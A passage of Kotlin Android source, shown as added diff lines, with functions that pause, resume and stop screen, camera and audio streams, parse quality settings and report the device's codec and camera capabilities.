+   861→            StreamManager.pauseStream(streamId)
+   862→            
+   863→            mapOf(
+   864→                "status" to "paused",
+   865→                "stream_id" to streamId,
+   866→                "message" to "Stream paused successfully"
+   867→            )
+   868→            
+   869→        } catch (e: Exception) {
+   870→            Log.e(TAG, "Failed to pause stream", e)
+   871→            mapOf(
+   872→                "status" to "error",
+   873→                "message" to "Failed to pause stream: ${e.message}"
+   874→            )
+   875→        }
+   876→    }
+   877→    
+   878→    /**
+   879→     * Resume a paused stream
+   880→     */
+   881→    fun resumeStream(context: Context, params: Map<String, Any>): Map<String, Any> {
+   882→        return try {
+   883→            val streamId = params["stream_id"]?.toString()
+   884→                ?: activeScreenStreamId
+   885→                ?: activeCameraStreamId
+   886→                ?: activeAudioStreamId
+   887→            
+   888→            if (streamId == null) {
+   889→                return mapOf(
+   890→                    "status" to "not_streaming",
+   891→                    "message" to "No stream to resume"
+   892→                )
+   893→            }
+   894→            
+   895→            StreamManager.resumeStream(streamId)
+   896→            
+   897→            mapOf(
+   898→                "status" to "resumed",
+   899→                "stream_id" to streamId,
+   900→                "message" to "Stream resumed successfully"
+   901→            )
+   902→            
+   903→        } catch (e: Exception) {
+   904→            Log.e(TAG, "Failed to resume stream", e)
+   905→            mapOf(
+   906→                "status" to "error",
+   907→                "message" to "Failed to resume stream: ${e.message}"
+   908→            )
+   909→        }
+   910→    }
+   911→    
+   912→    /**
+   913→     * Stop all active streams
+   914→     */
+   915→    fun stopAllStreams(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   916→        return try {
+   917→            Log.i(TAG, "Stopping all streams")
+   918→            
+   919→            val sessions = StreamManager.getActiveSessions()
+   920→            val streamCount = sessions.size
+   921→            
+   922→            StreamManager.stopAllStreams()
+   923→            
+   924→            // Clear all active IDs
+   925→            activeScreenStreamId = null
+   926→            activeCameraStreamId = null
+   927→            activeAudioStreamId = null
+   928→            
+   929→            mapOf(
+   930→                "status" to "success",
+   931→                "message" to "All streams stopped successfully",
+   932→                "streams_stopped" to streamCount
+   933→            )
+   934→            
+   935→        } catch (e: Exception) {
+   936→            Log.e(TAG, "Failed to stop all streams", e)
+   937→            mapOf(
+   938→                "status" to "error",
+   939→                "message" to "Failed to stop all streams: ${e.message}"
+   940→            )
+   941→        }
+   942→    }
+   943→    
+   944→    // ========== HELPER METHODS ==========
+   945→    
+   946→    /**
+   947→     * Parse quality string to Quality enum
+   948→     */
+   949→    private fun parseQuality(qualityStr: String?): StreamConfig.Quality {
+   950→        return when (qualityStr?.uppercase()) {
+   951→            "LOW", "480P" -> StreamConfig.Quality.LOW
+   952→            "MEDIUM", "720P", "HD" -> StreamConfig.Quality.MEDIUM
+   953→            "HIGH", "1080P", "FULL_HD", "FHD" -> StreamConfig.Quality.HIGH
+   954→            "ULTRA", "1440P", "QHD", "2K" -> StreamConfig.Quality.ULTRA
+   955→            else -> StreamConfig.Quality.MEDIUM
+   956→        }
+   957→    }
+   958→    
+   959→    /**
+   960→     * Get supported streaming capabilities of the device
+   961→     */
+   962→    fun getCapabilities(context: Context, params: Map<String, Any> = emptyMap()): Map<String, Any> {
+   963→        return try {
+   964→            val supportedCodecs = mutableListOf<String>()
+   965→            
+   966→            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+   967→                val codecCount = android.media.MediaCodecList.getCodecCount()
+   968→                for (i in 0 until codecCount) {
+   969→                    val info = android.media.MediaCodecList.getCodecInfoAt(i)
+   970→                    if (info.isEncoder) {
+   971→                        info.supportedTypes.forEach { type ->
+   972→                            when {
+   973→                                type.equals("video/avc", ignoreCase = true) && !supportedCodecs.contains("H264") -> 
+   974→                                    supportedCodecs.add("H264")
+   975→                                type.equals("video/hevc", ignoreCase = true) && !supportedCodecs.contains("H265") -> 
+   976→                                    supportedCodecs.add("H265")
+   977→                                type.equals("audio/mp4a-latm", ignoreCase = true) && !supportedCodecs.contains("AAC") -> 
+   978→                                    supportedCodecs.add("AAC")
+   979→                                type.equals("audio/opus", ignoreCase = true) && !supportedCodecs.contains("OPUS") -> 
+   980→                                    supportedCodecs.add("OPUS")
+   981→                            }
+   982→                        }
+   983→                    }
+   984→                }
+   985→            }
+   986→            
+   987→            // Check camera capabilities
+   988→            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as? android.hardware.camera2.CameraManager
+   989→            val cameraIds = cameraManager?.cameraIdList ?: emptyArray()
+   990→            val hasFrontCamera = cameraIds.any { id ->
+   991→                cameraManager!!.getCameraCharacteristics(id)
+   992→                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == 
+   993→                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+   994→            }
+   995→            val hasBackCamera = cameraIds.any { id ->
+   996→                cameraManager!!.getCameraCharacteristics(id)
+   997→                    .get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) == 
+   998→                    android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+   999→            }
+  1000→            val hasFlash = cameraIds.any { id ->
+  1001→                cameraManager!!.getCameraCharacteristics(id)
+  1002→                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+  1003→            }
+  1004→            
+  1005→            mapOf(
+  1006→                "supported_codecs" to supportedCodecs,
+  1007→                "screen_capture" to (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP),
+  1008→                "device_audio_capture" to (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q),
+  1009→                "camera" to mapOf(
+  1010→                    "available" to cameraIds.isNotEmpty(),
+  1011→                    "front_camera" to hasFrontCamera,
+  1012→                    "back_camera" to hasBackCamera,
+  1013→                    "flash" to hasFlash
+  1014→                ),
+  1015→                "microphone" to true,
+  1016→                "max_resolution" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) "1080p" else "720p",
+  1017→                "max_fps" to 60,
+  1018→                "adaptive_bitrate" to true,
+  1019→                "noise_suppression" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) 
+  1020→                    android.media.audiofx.NoiseSuppressor.isAvailable() 
+  1021→                else 
+  1022→                    false
+  1023→            )
+  1024→            
+  1025→        } catch (e: Exception) {
+  1026→            Log.e(TAG, "Failed to get capabilities", e)
+  1027→            mapOf(
+  1028→                "status" to "error",
+  1029→                "message" to "Failed to get capabilities: ${e.message}"
+  1030→            )
+  1031→        }
+  1032→    }
+  1033→}
+  1034→
